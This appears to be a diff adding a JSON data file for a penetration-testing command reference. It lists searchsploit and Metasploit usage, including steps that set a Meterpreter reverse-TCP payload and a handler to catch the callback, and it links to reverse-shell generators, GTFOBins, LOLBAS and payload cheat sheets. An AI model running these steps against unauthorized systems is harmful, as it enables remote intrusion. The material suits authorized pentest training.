@@ -1,0 +1,140 @@
+{
+  "categories": [
+    {
+      "category": "0. Exploit-Search & Framework Basics",
+      "tasks": [
+        {
+          "id": "ss_search_mirror",
+          "title": "Searchsploit: Find & Retrieve Exploits",
+          "description": "Search the local ExploitDB mirror by service/version/CVE, then copy the matching exploit into your working directory instead of running it from /usr/share — copies are safer to edit (IP/port placeholders) and keep loot organized per host.",
+          "commands": [
+            "searchsploit <service_name_and_version>",
+            "searchsploit --nmap scan.xml",
+            "searchsploit -w <search_term>",
+            "searchsploit -m <EDB-ID>",
+            "searchsploit -u"
+          ]
+        },
+        {
+          "id": "msf_search",
+          "title": "Metasploit: Searching for Modules",
+          "description": "Search msfconsole's module database by name, CVE, platform, or type before assuming you need a manual exploit.",
+          "commands": [
+            "msfconsole -q",
+            "search eternalblue",
+            "search cve:2021-34527",
+            "search type:exploit platform:windows smb"
+          ]
+        },
+        {
+          "id": "msf_select_payload",
+          "title": "Metasploit: Select a Module & Payload",
+          "description": "Load a module, list compatible payloads, and set one before configuring the rest of the options. `show payloads` only lists payloads valid for the currently loaded module/target.",
+          "commands": [
+            "use <module_path>",
+            "show payloads",
+            "set payload windows/x64/meterpreter/reverse_tcp",
+            "show options",
+            "set RHOSTS {target_ip}",
+            "set LHOST <Kali_IP>",
+            "set LPORT 4444",
+            "run"
+          ]
+        },
+        {
+          "id": "msf_handler_setup",
+          "title": "Metasploit: Set Up a Multi/Handler",
+          "description": "Use this when the payload was generated externally (e.g. msfvenom) and you just need something in msfconsole to catch the callback — the payload here must exactly match what was generated (type, arch, LHOST/LPORT).",
+          "commands": [
+            "use exploit/multi/handler",
+            "set payload windows/x64/meterpreter/reverse_tcp",
+            "set LHOST <Kali_IP>",
+            "set LPORT 4444",
+            "exploit -j -z",
+            "sessions -l",
+            "sessions -i <session_id>"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "1. Reverse Shell Generators",
+      "tasks": [
+        {
+          "id": "link_revshells",
+          "title": "Reverse Shell Generator (revshells.com)",
+          "description": "Auto-generates reverse shell one-liners (bash, python, php, powershell, nc, msfvenom, etc.) for a given IP/port — faster than hand-writing one when the target's available interpreters are unclear.",
+          "commands": [
+            "# https://www.revshells.com/"
+          ]
+        },
+        {
+          "id": "link_pentestmonkey_shells",
+          "title": "Pentestmonkey Reverse Shell Cheat Sheet",
+          "description": "Reference list of reverse shell one-liners per language/interpreter, useful as a fallback when revshells.com doesn't cover an unusual interpreter.",
+          "commands": [
+            "# https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "2. Living-off-the-Land / Binary Abuse",
+      "tasks": [
+        {
+          "id": "link_gtfobins",
+          "title": "GTFOBins",
+          "description": "Lookup table of Unix binaries that can be abused to bypass local security restrictions (shell breakout, file read/write, privesc) via SUID, sudo, or capabilities.",
+          "commands": [
+            "# https://gtfobins.github.io/"
+          ]
+        },
+        {
+          "id": "link_lolbas",
+          "title": "LOLBAS",
+          "description": "Windows equivalent of GTFOBins — living-off-the-land binaries, scripts, and libraries usable for download, execution, or privesc without dropping extra tooling.",
+          "commands": [
+            "# https://lolbas-project.github.io/"
+          ]
+        },
+        {
+          "id": "link_hacktricks",
+          "title": "HackTricks",
+          "description": "Broad technique reference covering enumeration, privesc, and AD attacks across both Windows and Linux — good second opinion when the built-in methodology doesn't cover an edge case.",
+          "commands": [
+            "# https://book.hacktricks.wiki/"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "3. Encoding, Hashing & Payload Cheat Sheets",
+      "tasks": [
+        {
+          "id": "link_cyberchef",
+          "title": "CyberChef",
+          "description": "Browser-based swiss-army-knife for encoding/decoding/hashing/crypto (base64, URL, hex, XOR, JWT, etc.) — useful for anything more involved than the built-in Base64 tool handles.",
+          "commands": [
+            "# https://gchq.github.io/CyberChef/"
+          ]
+        },
+        {
+          "id": "link_payloadsallthethings",
+          "title": "PayloadsAllTheThings",
+          "description": "Large reference of payloads and bypass techniques across injection classes (SQLi, XSS, SSRF, command injection, file upload, etc.).",
+          "commands": [
+            "# https://github.com/swisskyrepo/PayloadsAllTheThings"
+          ]
+        },
+        {
+          "id": "link_pentestmonkey_sqli",
+          "title": "Pentestmonkey SQL Injection Cheat Sheets",
+          "description": "Database-specific SQLi syntax reference (MySQL, MSSQL, Oracle, PostgreSQL) for building blind/UNION-based payloads by hand.",
+          "commands": [
+            "# https://pentestmonkey.net/category/cheat-sheet"
+          ]
+        }
+      ]
+    }
+  ]
+}
